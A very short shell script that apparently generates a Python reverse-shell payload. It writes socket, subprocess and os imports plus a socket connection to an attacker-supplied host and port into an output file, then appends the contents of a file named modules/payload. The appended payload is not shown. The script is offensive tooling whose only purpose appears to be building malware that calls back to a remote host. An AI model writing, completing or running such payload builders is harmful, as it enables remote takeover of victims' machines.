echo "import socket
import subprocess
import os

s = socket.socket()
s.connect(('$1', $2))" > $3
cat modules/payload >> $3